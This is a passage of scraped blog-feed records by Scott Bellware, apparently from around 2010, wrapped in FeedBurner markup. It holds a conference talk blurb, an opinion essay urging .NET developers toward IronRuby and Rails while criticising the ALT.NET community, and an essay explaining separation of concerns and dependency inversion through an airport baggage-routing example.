href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=oL7ssLp0ICQ:DmLZK_UDVCI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/oL7ssLp0ICQ\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1062}}

Web designers are critical members of web startup teams, and learning to deal with web design specialists is vital to a rapid startup’s ability to sustain its pace. This presentation talks about two web startups that applied lean thinking and pull and flow to this particular challenge, and the techniques and understanding that came from the experience.<br /><br />Check out the full agenda on the LeanSSC conference website:<br /><a href=\"http://atlanta2010.leanssc.org/agenda\">http://atlanta2010.leanssc.org/agenda</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=dDTYWnsli84:4RTJWEjNNXI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=dDTYWnsli84:4RTJWEjNNXI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/dDTYWnsli84\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1063}}

Put that in your pipe and smoke it @Bellware. The asymptote has collapsed!\" (<a href=\"http://twitter.com/haacked/statuses/12089448455\">original tweet</a>)</blockquote>I quipped with Phil when he was in Austin a while ago that, \"IronRuby is asymptotic to shipping\", which is the inside joke he's referring to. The point being that IronRuby has taken long enough to ship that it's dangerously close to that point of a multi-year software project where it may not be able to cross the last mile.<br /><br />IronRuby has indeed crossed the last mile, and on April 12th, Jimmy Schementi and team announced the<a href=\"http://ironruby.codeplex.com/releases/view/25901\">availability of IronRuby 1.0</a>.<br /><br />A hearty congratulations to the IronRuby and DLR team for getting IronRuby done, and to<a href=\"http://iunknown.com/\">John Lam</a>for getting the ball rolling with his<a href=\"http://rubyforge.org/projects/rubyclr/\">RubyCLR</a>project in<a href=\"http://rubyforge.org/frs/?group_id=1470\">2006</a>. It's a great accomplishment and another feather in the cap for the ever expanding diaspora of Ruby implementations, and most definitely a giant leap forward for .NET development and programming.<br /><br /><span style=\"font-weight: bold;\">Enter ASP .NET MVC and the Loss of an IronRuby Vanguard</span><br /><br />The furor surrounding Ruby isn't now what it was three years ago when<a href=\"http://iunknown.com/2007/04/introducing-ironruby.html\">IronRuby was announced</a>. In the .NET community, the attention given to Ruby on Rails two and three years ago has largely subsided. The audience has had its attention redirected to ASP .NET MVC. Ultimately, I see this as a loss not only for IronRuby, but arguably also for the community.<br /><br />There are a lot of newly-minted MVC developers in the web development community of .NET developers. I'm skeptical about comparisons made between ASP .NET MVC and Ruby on Rails by folks in the .NET community who haven't shipped a Rails project. These comparisons are often shallow and uninformed by experience. They're also not peer comparisons, and tend to point out things that one framework has that the other doesn't without consideration of whether these features are useful in both paradigms (yes, I sometimes use view models in Rails, I just don't require their signatures to be frozen before runtime so that static analysis tools have an easier job of it).<br /><br />The<a href=\"http://altnetpedia.com/\">ALT.NET</a>community would have been the audience that was best-prepared to perceive and leverage the power of Rails, arguably via IronRuby, but instead it led the vanguard into ASP .NET MVC.<br /><br />There is a tremendous wealth of uses for IronRuby but Rails has been the usual gateway to broader adoption of Ruby. With the<a href=\"http://linuxdevcenter.com/pub/a/mac/2002/05/14/oreilly_wwdc_keynote.html\">Alpha Geek's</a>attention redirected to ASP .NET MVC, the gateway isn't being crossed by the .NET intelligencia the way that it was by the Java community intelligencia that was ALT.NET's most influential inspiration.<br /><br />For folks like myself who've invested enough effort to understand why some of our most respected teachers moved from Java for web application delivery to Ruby and Rails, there's no meaningful comparison of ASP .NET MVC to Rails.<br /><br />While ASP .NET MVC has made significant progress in the past two years, it progresses at a snail's pace. We can contrast ASP .NET MVC's technology to Rails' technology, but this is the typical mistake that .NET developers make when trying to compare ASP .NET MVC to Rails because ASP .NET MVC doesn't have a whole ecosystem on the magnitude of the Rails ecosystem. This ecosystem includes not only the core framework technology itself, but the vast number and quality of plugins and packages for Rails (including those built for general Ruby development), the integrations with value-add services for both web businesses and web infrastructure, the vast array of hosting options and architectures, and the brain trust residing in the Ruby and Rails community.<br /><br />Through a few years of working in Rails, I've come to a deeper understanding of Ruby (but I'm still no expert). And through this experience I've come to look at my own previous feelings about C# and static programming as a little shallow. It doesn't in fact amount to a personal preference, as many monocultural programmers have suggested to me. It's a matter of rational analysis and a willingness to accept the results of that analysis even of it contradicts my strongest feelings, my current preferences, and creature comforts.<br /><br />After working with Ruby for some time, it started to become absurd to me to continue to build dynamic, adaptable systems with languages that aren't a great fit for this kind of work. I began to see that<a href=\"http://www.dofactory.com/Patterns/Patterns.aspx\">static design patterns</a>were inevitably a mostly-wasteful workaround for trying to implement composable designs with languages that are hostile to this goal. I came to see that I was personally stimulated by the efforts to solve these dynamic programming problems with static languages. And I came to see that I wasn't being paid to put myself in the way of interesting but non-essential puzzles just to have a chance to solve them. There are other problems to solve - productivity problems, most notably, and business problems.<br /><br />To me, this meant facing a hard inevitability: the de-emphasizing of a skillset that I had worked years to acquire, and a commitment to re-learning. The payoff, I knew, would be a reward in greater productivity and elevated conscious awareness.<br /><br />I'm still learning, but there are many things that I have already learned in the past three years. One of the most important things that I have learned is that solving dynamic programming problems with static programming languages - while stimulating - is counter-productive except as a performance optimization. And even at that, I might consider alternative solutions, as GitHub, Twitter, and others have done in exploring high-performance, message-based, actor model functional languages like<a href=\"http://www.erlang.org/\">Erlang</a>, a technology underlying new orders of performance technologies like<a href=\"http://couchdb.apache.org/\">CouchDB</a>and<a href=\"http://www.rabbitmq.com/\">RabbitMQ</a>.<br /><br />Most of all, I learned that even some of the most progressive .NET developers - even in today's ALT.NET community - are driven by a trepidation over a programming life without Visual Studio, and by association,<a href=\"http://www.jetbrains.com/resharper/\">ReSharper</a>.<br /><br />I've cautioned for sometime that there's a disturbing tendency toward what I've called \"ReSharper-Driven Development\". Far too many developers don't find anything wrong with saying, \"I won't consider developing without ReSharper\". I'd rather hear developers say, \"I won't consider letting anything get in the way of my discovery of sources and paradigms of productivity and effectiveness that I simply haven't considered or can't conceive of yet\".<br /><br />I've got nothing against ReSharper, Visual Studio, or any other advanced development workbench (like<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>, for example). I was in the first wave adopters of ReSharper, and I was the first member of the community to have sponsorship from JetBrains for ReSharper. I was also a user of its predecessor,<a href=\"http://sharptoolbox.com/tools/csharp-refactory\">C# Refactory</a>, going back to Visual Studio 2003. Nonetheless, I'm also willing to use a much more light-weight editor like<a href=\"http://macromates.com/\">TextMate</a>or<a href=\"http://monodevelop.com/\">MonoDevelop</a>. After twenty-some years of playing guitar, I'm also willing to pick up any guitar I can get my hands on just to have an experience of it, knowing that I'll be enriched by the diversity of the experience, and to know that this diversity is the foundation of my ability to continue learning at a pace that matters and to counteract the human tendency toward intellectual contraction and conservatism that is the inevitable side-effect of long-term, focused experience.<br /><br /><span style=\"font-weight: bold;\">ALT.NET without the \"ALT\"</span><br /><br />Some time in late 2007 I proposed \"Integrity, Courage, Diversity\" as ALT.NET's credo and motto. It didn't go too far and I didn't pursue it. It wouldn't be too long afterward that I'd realize that community leaders with great influence would begin to make exceptions for themselves in entitlements to using ALT.NET not for community service, but to justify efforts in celebrity-seeking as conveniently-beneficial to the greater good. ALT.NET became a launching pad for yet-another-BDD-or-MVC-clone-framework in the .NET space, as well as a way to secure increasingly more high-profile public appearances.<br /><br />I didn't agree with<a href=\"http://laribee.com/\">David Laribee</a>when he turned his attentions to means to \"monetize ALT.NET\". ALT.NET had barely established an unshakable foundation in diversity, courage, and integrity and had ultimately begun to come under attack from a myriad parties who wanted it bent to promote this or that bid for materialistic entitlement. It was like watching those parents who are willing to take their toddlers to auditions for movies, commercials, and pageants before the children had become self-actualized in their own sense of integrity. It was too soon. As clear as this was to me then, it's painfully and crystal clear now.<br /><br />I don't agree with<a href=\"http://codebetter.com/blogs/jeremy.miller/\">Jeremy Miller</a>, creator of the .NET MVC framework,<a href=\"http://fubumvc.com/\">FubuMVC</a>, who has suggested that .NET has now matured enough be<a href=\"http://www.altnetpodcast.com/episodes/18-talking-with-jeremy-miller-about-alt-net\">as satisfying as Ruby and Rails</a>. I think that this is only true from a place in life where we're driven unconsciously by the pleasure of solving static programming patterns problems.<br /><br />I don't agree with<a href=\"http://www.lostechies.com/blogs/chad_myers/\">Chad Myers</a>who has implied that FubuMVC has advantages that Rails doesn't, without considering paradigm differences in working with Rails that may negate the value of things that may be advantages to static language pattern development.<br /><br />I took heat from ALT.NET community members when I founded the ALT.NET Summit in 2007, introducing the .NET community to Open Space, and pushing a meme beyond the tipping point that within a couple of months of<a href=\"http://laribee.com/altnet\">Dave's coining of ALT.NET</a>had already started to fade into the typical background noise of fleeting fads. I took heat for building the conference website in Rails, stopping an on-going project to build the site on<a href=\"http://www.castleproject.org/monorail/\">MonoRail</a>after reviewing the site's code written in C# and realizing that the Rails equivalent would be much more<a href=\"http://en.wikipedia.org/wiki/Edsger_W._Dijkstra\">elegant</a>and less frustrating to deal with the torrent of frequent updates that hit a conference website in the weeks leading up to the event.<br /><br />I have a profound respect for Dave having followed suit, building the<a href=\"http://altdotnet.org/\">altdotnet.org</a>website on Rails rather than .NET, learning from experience, and making decisions informed not only by unconscious attachment, but also by experience shipping a project on a technology. I also think it's laudable that<a href=\"http://laribee.com/\">Dave's blog</a>is built on<a href=\"http://wordpress.org/\">WordPress</a>, demonstrating that working with .NET doesn't require you to publish on<a href=\"http://telligent.com/support/communityserver/\">CommunityServer</a>, and that there are best-of-breed solutions outside of .NET monoculture that are preferable - whether they stimulate your current creature comforts or not.<br /><br />ALT.NET was founded as a movement, even though the<span style=\"font-style: italic;\">movement</span>has been all but cleansed from the ALT.NET culture and history. In the redacted quote of Dave's original communication of ALT.NET to the community that holds a prominent position in the<a href=\"http://altnetpedia.com/\">altnetpedia website</a>, the following quote from Emerson is conspicuously absent: \"there are always two parties; the establishment and the movement\". Dave goes on to say, \"If you’re ALT.NET, you’re in the movement. You’re shaking out the innovation. When the movement fails, stalls, or needs improving you’re there starting/finding/supporting that next leap forward.\"<br /><br />Today's representation of ALT.NET stands in stark contrast to what people like myself had invested years of work in studying, practicing, teaching, traveling, meeting across the aisle, negotiating, volunteering, community organization, activism, lobbying, protesting, triumphing, sometimes losing, constantly sustaining and persisting in the face of an entrenched entitled cast of Microsoft community characters, and not just a small amount of personal sacrifice to build.<br /><br />And while Jeremy has gone to great lengths to misrepresent the many years of dedication as a \"holy crusade\" and thus make it unpalatable for members of the ALT.NET community to expect the same commitment of themselves and thus of the community leaders that have not abandoned what ALT.NET had become, ALT.NET's diversity, integrity, and courage continues to become increasingly irrelevant considerations for the community.<br /><br />And as diversity continues to erode, and mediocrity continues to accrete in mainstream .NET, so it does in ALT.NET as ALT.NET becomes the same kind of cultural body as the mainstream that it had intended to provide an alternative for. While ALT.NET adopts the exact same social mechanics as the mainstream entrenchment in serving the celebrity-seeking entitlements, great advances like IronRuby fall by the wayside if they represent inconvenient truths to what is now an ALT.NET establishment.<br /><br /><span style=\"font-weight: bold;\">An Alternative to the Alternative</span><br /><br />If the ALT.NET community continues down the path of fear into the exact same kind of tool-driven development behaviors that it criticizes Workflow Foundation and Entity Framework users for, it will undoubtedly miss the incredible opportunity that IronRuby lays at its feet.<br /><br />ASP .NET MVC is not a peer to Rails. Not by a long shot. C#, even with the<span style=\"font-style: italic;\">dynamic</span>keyword, named parameters, and extension methods, is not a compositional language like Ruby. There is more power in this framework, language, and ecosystem than .NET developers - be they mainstream, ALT.NET, or progressives - may have had the occasion to understand.<br /><br />If you value your experiences with MVC, then you might value the works that ASP .NET MVC has attempted to interpret, largely creating a low-fidelity facsimile that is generations behind the originals. If you're a patterns developer, an agilist, a test-driver, and an amateur of forward-thinking, no-limits technology communities, then the Ruby community - to my eyes - has more to offer you than what has become of ALT.NET in its present incarnation.<br /><br />You don't have to leave .NET and Windows to experience Rails and Ruby as many notable .NET influencers have - although, like them, you might decide that .NET and Windows are unnecessary to building great web products. Nonetheless, now you have a choice.<br /><br />You also have a choice to continue to have your attentions re-directed to lessor solutions. But understand that now that IronRuby has dropped, you're choosing lessor .NET solutions. And while it might be understandable that you aren't comfortable with anything other than Windows, you can experience Rails on IronRuby and use IIS as your application server.<br /><br />And best of all, in the original spirit of ALT.NET, you will have a universe of alternatives available to you if you choose to take advantage of them. Alternatives that include:<br /><ul><li>Immediate support for RESTful design and resource-oriented MVC</li><li>A more mature and fully-featured routing engine including route helpers</li><li>A better plugin model with orders of magnitude more available plugins and service integrations</li><li>A package distribution system right now with Ruby Gems</li><li>Hosting in the cloud without constraints using platforms like Amazon EC2, Rackspace, Engine Yard</li><li>Managed cloud fabric like Heroku if the bare-metal cloud doesn't suit you</li><li>More mature client libraries for emerging high performance storage, caching, application server, and middleware technologies</li><li>Being in a social and business community that builds game-changing products and services like Hulu, GitHub, and Twitter</li><li>Participating in the community that is making the greatest advances in TDD and testing tools and methodology</li><li>And best of all: being able to look back a year from now and realizing all that you've learned about what you thought you knew :)<br /></li></ul><br /><span style=\"font-weight: bold;\">Resistance</span><br /><br />You're going to face resistance and maybe even vilification in some cases in the .NET community if you make such a move. If you value the courage that progressive software development is all about, you'll weather the storm and build character in the process.<br /><br />If the ALT.NET community had stayed on-target with Ruby and IronRuby, there would be a good number of popular bloggers who might loose their audience. You're not in this profession to provide those with a sense of ongoing entitlement to a perpetual audience with even more entitlements. It's not your job to sit at the feet of static pattern puzzle-solving masters in a time when the necessity of those puzzles is simply no longer an absolute.<br /><br />There are a whole set of patterns waiting for your discovery and participation, and they don't require you to obscure the intension of your code with compiler pragma noise like interface types, generics, and casting.<br /><br />If you like to have your brain tickled by patterns, check out<a href=\"http://www.designpatternsinruby.com/\">Design Patterns in Ruby</a>(and consider paying close attention to the last section which offers patterns specific to Ruby and dynamic languages), or the<a href=\"http://www.amazon.com/Smalltalk-Best-Practice-Patterns-Kent/dp/013476904X\">Smalltalk Best Practice Patterns book</a>by<a href=\"http://www.threeriversinstitute.org/Kent%20Beck.htm\">Kent Beck</a>.<br /><br />Stop waiting for the next immature .NET pseudo-port of a Ruby project. Just use the Ruby version. You don't need a .NET version of Gems just so that some social-climbing .NET open source celebrity-seeker can take a firmer grip on your attention. Just use Ruby Gems. Heck, you could use Ruby Gems right now for your .NET package management.<br /><br />Stop waiting for ASP .NET MVC to catch up to Rails. Didn't you adopt open source to begin with because you were fed up with waiting for Microsoft's snail's pace of innovation and sunk-cost product management politics to catch up to the level of your expectations?<br /><br />Despite<a href=\"http://jeffreypalermo.com/\">Jeffrey Palermo's</a>recent<a href=\"http://deepfriedbytes.com/podcast/episode-48-web-development-with-asp-net-mvc-in-action-authors/\">flattering</a>of the ASP .NET MVC team's understanding of Test-Driven Development, Phil Haack and team were deeply in the weeds when it came to TDD, and to the credit of Phil's courage and integrity, he's left<a href=\"http://haacked.com/archive/2007/12/09/writing-unit-tests-for-controller-actions.aspx\">remnants of those difficult times</a>in the clear for others to learn from. Making mistakes in public and having a consistent persona both on-camera and off are critical to establishing a community of integrity. The remnants of leadership in the ALT.NET community could learn a lot from Phil about this.<br /><br />The repercussions of some naive MVC framework design decisions in ASP .NET MVC may never be rooted out of the framework because of Microsoft's bureaucratic policies regarding the need for near-infinite backward compatibility for those massive corporate Microsoft customers who cannot create the kinds of learning organizations that mitigate these kinds of problems. Rails, on the other hand, simply<a href=\"http://guides.rails.info/3_0_release_notes.html\">does not labor under the same drastic limitations</a>.<br /><br /><span style=\"font-weight: bold;\">Burn Me! I'm a Witch!</span><br /><br />I know that I'm going to catch more heat for this article. People will say that I'm unrealistic to think that .NET shops can adopt Rails, although I, and many others, have led .NET shops through Rails adoption. They may point to the Rails project failure at Dovetail as an example without pointing out that the current project at Dovetail is more than 100% over-budget, and seems to produce more open source and celebrity than money. Mention of product and team management failures at Dovetail might also also be neglected. We shall see.<br /><br />It may be said that I'm out of step with what ALT.NET has evolved into (something that I feel an immense source of personal and ethical accomplishment about) without pointing out that I'm still dedicated to living my professional life as an example of on-going community service, knowing that through the many years that I have been doing it have shown me that seemingly insurmountable changes can be made in relatively short periods of time with a community of practice focused on bigger goals than celebrity entitlement.<br /><br />And most trivially, my lack of talent in structuring short, clear sentences may be used to malign the message that they contain in an effort to continue to sideline me and my perpetual pleading for more critical thinking driven by experiential learning and community service in the .NET community.<br /><br />I haven't stopped asking the .NET community to stretch out beyond Microsoft's own sunk-cost imperatives - not since I founded the Austin .NET User Group in 2001; not since becoming chairman of the INETA speaker committee and working to get more progressive speakers involved who weren't purveyors of Microsoft's message; not since getting involved with DevTeach years before the vast majority of you had heard of it and working toward a day when the conference would feature progressive topics; not since organizing the ALT.NET Summit in an effort to insulate it and the practices that it advocates from the ravages of fleeting fad; not since writing and organizing the popular movement to redirect the Entity Framework team into more responsible and sustainable design (and subsequently quietly teaching them a Test-Driven Development workshop sans compensation); not since putting my MVP status on the line for my principles rather than allowing it or money gigs with Redmond to modulate my values; not since establishing the Progressive .NET events in London and Stockholm to encourage<span style=\"font-style: italic;\">teaching</span>in the .NET community rather than just<span style=\"font-style: italic;\">speaking</span>(although the celebrities that I'd gotten involved in that event have since refuted any responsibility to form a teaching practice and I've distanced myself from the events); not since organizing the Monospace events in Austin and Oslo to promote open source and diversity in the .NET space; not since working with the Austin Software Mentors group who are tutoring University of Texas students on contemporary software development techniques to prepare them for the real world after graduation; not since founding and facilitating the Lean Software Austin group to deepen the dialog in our community about meaningful productivity above and beyond celebrity agile; and not since connecting countless software developers to countless opportunities free of the mindlessness that accretes around entrenched entitlement power cliques in the Microsoft community.<br /><br />And I'm reaching out to you again - asking you to reconsider your adoption of ASP .NET MVC over Rails and your fixation with editor-assisted programming and design over using IronRuby and Ruby.<br /><br />There's an amazing world of capabilities that you've yet to discover far beyond static design pattern puzzles and ReSharper-Driven Development. There's a seed of courage that I'm counting on that I hope is still alive and well in .NET community even if it has been dormant for some time in the cold leadership vacuum left behind by the abandonment of .NET by some of our best and brightest.<br /><br />In the end, you live your career life for yourself and not for me. And hopefully you won't be living it for the pleasure of folks who benefit from keeping you bogged down in a status quo that serves their interests more than yours. I may be asking you to take a more giant leap than you're ready for, but at least I'm not asking you to choose stasis. And I hope that the personal sacrifices that I've made for .NET community over the past ten years have left a modicum of credibility that would have you consider this:<br /><br />IronRuby has dropped. Hear it? It will change your outlook on so much of what you do as a programmer and open you to a much broader world of software development and possibility. Trust me on this one. I've never given you a reason to doubt that I'm in your corner; that I've got your back; and that I'll drop what I'm doing to spend time with you learning and teaching rather than defending the fiefdom of my own .NET celebrity.<br /><br />IronRuby isn't a magical vessel that holds mystical truths, but it just may be the next leap forward in your programming that Dave hinted at back in 2007 before all of this proceeded from<span style=\"font-style: italic;\">movement</span>to<span style=\"font-style: italic;\">establishment</span>.<div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Nca5F6G_-XA:0TEAUVdBPW4:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Nca5F6G_-XA:0TEAUVdBPW4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/Nca5F6G_-XA\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1064}}

The parts of your software are shaped to the way that your mind holds on to them.  \"Abstraction\" means the same thing to software as to thinking. \"Concern\" is another word the shows how software reflects thinking. A software \"concern\" is something that I have put my focus on that is my present concern.<br /><br />The compartmentalized bits of software are the shapes of your software's parts. The shape of your software and its parts is only one aspect of your software's design. The shapes of your software's parts is a \"static design\". \"Schema\" is another word for it. The other aspect of your software's design has to do with what happens when we bring the parts together, give them a problem to solve, and give them the green light.<br /><br />We lose software development productivity to relearning and to misunderstanding. The design quality issues that makes it hard to learn, re-learn, and understand your software also make it hard to understand how it works and whether it works. Powerful tools that optimize the moment of creation of the parts of your software enhance your ability to lower productivity.<br /><br />\"Module\" is another word for \"compartment\". A class is a module. Modular design has to be productive not only in its shape, which helps us understand how the software is broken down into concepts, but also in how those parts do some work, and how they work together, and whether they leave their tools out where you can trip on them in the dark.<br /><br />Software is a machine. It's not a machine like your car's engine or your cordless drill, or like any machine that is made with material. Analogies to physical machines break down almost immediately. There are no machines in physical space that are anything like software machines. They're machines that run individuals' personal way of thinking of how to solve a problem. There are as many ways to program a solution as there are programmers.<br /><br />Software is a machine. It's made of parts. The word \"soft\" in software says that it's easy to not only change the working of the parts, but also the shapes of the parts, and to even move the workings to a different part (which often then tells you to change the shape again).<br /><br />The first great matter of software development is proving that the new shape of some part of your software will still do what you expect it to do when you turn the machine on. The second great matter of software development is whether the shape that you've given to the software will continue to make sense, and that the workings of the software are placed in the right parts.<br /><br />There's one gigantic difference between working on software machines and working on physical machines that bears mention:<br /><br />The parts of physical machines wear out, and we replace them with another, new copy of the same part. This doesn't happen with the software parts that you make. When we change software parts, we don't replace ones that have worn out with new parts from the same mold. When we change software software parts, we change the very shape of those parts, often re-shaping the parts around them as well, and moving the workings of one part to a different part, or even a new part created on the spot as part of a new compartmentalization. In relation to a physical machine, software is much more like the mold than the product. Software development is closer to die making than stamping.<br /><br />Every time you make a change to a software machine, there's a good chance that the change shows up in an adjacent part, and there's a good chance that it'll show up when you're not looking at it. It's a lot easier to get the code you're looking at right than the code your not looking at. That's what \"<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\">control and observe</a>\" is talking about.<br /><br />To increase the chances of software working as expected after you've tried to turn a part of it into a hat, a broach, or a pterodactyl, you make observations of it. If the only way that you can observe the functioning of the part is to bring the whole machine online, your productivity is many times less than what it should be. If you can make easy observations of the part that you're working on (and maybe parts in the vicinity), you can also make those observations<span style=\"font-style: italic;\">while</span>you're working on it so that not<span style=\"font-style: italic;\">all</span>of the steps are wild leaps into the yonder.<br /><br />Imagine software that routes baggage from an airline check-in desk through the bowels of an airport's network of conveyor belts and scanners until it arrives at the right gate for the airplane that you're traveling on. Let's say you reshape the part of the software that figures out whether to route baggage to gate 1 in terminal A or to gate 2 in terminal A. Same terminal, different gate. You're losing productivity if you have to start the process from the part of the software that decides to route the baggage between terminal A or terminal B.<br /><br />Here's the problem:<br /><br />You need to observe the gate router, but you must control both the gate router and the terminal router. Controlling the terminal router now is wasted work.<br /><br />You need to feed the terminal router with the circumstances so that you're controlling it to choose the terminal A route. You also feed it the circumstances that it passes on to the gate router so that it does the thing that you expect it to, and so that you can observe that. The terminal router is superfluous in this scenario. You're concerned with the gate router, but you also have to be concerned with the terminal router's workings, even to the point of being concerned with how it gathers the information from its inner workings to pass to the gate router.<br /><br />If your concern is the workings of the gate router, then you should only have to control the gate router, feeding it the information it needs directly without going through any intermediaries. It's what \"separation of concerns\" is talking about. Collusion of concerns makes you write more code (and more complex code) to make observations about your software, but it also throws attention switching into work that is trying to be a feedback loop.<br /><br />If you have a gate routing module, you can likely control it and observe it directly. But what happens when you want to control and observe the terminal routing module? The terminal router will immediately pass the baggage off to the gate router after it has done its work. Can you control the workings of the terminal router without also having to feed it the right information that it needs to feed to the gate router so that the gate router doesn't accidentally raise an error? In other words, how do you control and observe the terminal router without having to be concerned about what the gate router needs to know to do it's job. If there was an accident rate in software development like there is in other production jobs, it would be measured by how often we accidentally have our attention sucked too far into a wood chipper of dependency inversion.<br /><br />With the right modularity, you've addressed the \"static design\". The \"dynamic design\" is how the parts of the software are put together to make the machine. A software machine is put together at runtime, usually by something called a front controller. A Main method is an example of a front controller. So is the thing that receives an HTTP request and sends its instructions it to the right part of your application. This is the part of design that a lot of developers don't recognize as the sore spot of their productivity problems.<br /><br />There some esoteric terms for this issue of controlling which modules you have to be concerned with when making observations. Much of the language is more complicated than the actual work that you have to do. If you don't get distracted by the lingo, you'll find that this is not only one of the most important problems to solve, but also one of the easiest!<br /><br />If the part of your software machine that routes baggage from the check-in desk to the right terminal passes control to the part of the software that routes the baggage to the right gate, then the terminal router will likely need to call a method on the gate router (or send a message to it). If I just want to control and observe the terminal router without having to be concerned with the gate router, then I've got problem that can be solved by getting the terminal router to use a dummy gate router instead of the real gate router. I can't change the terminal router code so that it doesn't use a gate router at all when I'm trying to make these observations, because that's not the code that would run live anyway. It wouldn't be a real observation of the thing that I'm concerned with in the first place.<br /><br />If the terminal router uses a dummy gate router, I don't have to be nearly as concerned with it as I am with my primary concern, which is the terminal router. This is what \"separation of concerns\" is talking about.<br /><br />The last thing that you have to solve is a way to switch the gate routing part for a dummy gate router. That's not a hard problem to solve. If you have a terminal router object, you can create a constructor that accepts a fake gate router. The terminal router's default constructor can create a real gate router. When you need to observe the terminal router's workings, create a dummy gate router object that doesn't have to be more talented than not raising errors when it's not supposed to and pass it to the terminal router's constructor.<br /><br />The term for this pattern is called \"inversion of control\", or \"dependency inversion\", or \"don't distract me with superfluous concerns\".<br /><br />This is a really simple way to get superfluous concerns out of the way so that they don't interfere with the parts of your software that you're actually concerned with. The above technique is sometimes called \"poor man's inversion of control\". There are many free libraries that you can use to automate all this stuff and make describing how the parts fit together effortless (or better, unnecessary). They are \"dependency injection frameworks\" or \"inversion of control containers\". I like the word \"composer\".<br /><br />The dynamic side of productive software design is all about putting the parts of the machine together when your system starts up (or on-demand). The effort that you put into the static parts of the design - the shapes, the geometry, the abstractions - is paid off when you're in complete control of which parts are in-motion when you need to make observations of your software. And to belabor the point: it's the ability to<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\">control and observe</a>your software that will give you more productivity, or to restore your productivity. You can't use what you can't understand, and you can't understand what you can't control 